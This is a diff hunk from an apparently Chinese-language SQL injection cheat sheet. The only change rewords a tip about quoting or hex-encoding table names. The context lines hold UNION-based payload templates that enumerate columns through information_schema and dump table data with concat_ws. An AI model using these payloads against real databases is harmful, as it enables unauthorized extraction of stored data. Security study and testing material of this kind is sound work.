@@ -12,7 +12,8 @@
 查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
 查数据: union select num1,concat_ws(0x7e,列名,列名) from 库名.表名
 
-注意点: 1.表名要么加上引号，要么建议使用十六进制
+注意点: 1.表名加引号，推荐改为十六进制
+
 ```
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;报错查询: 通过 union 操作符，合并两个或者多个select语句的结果集
 
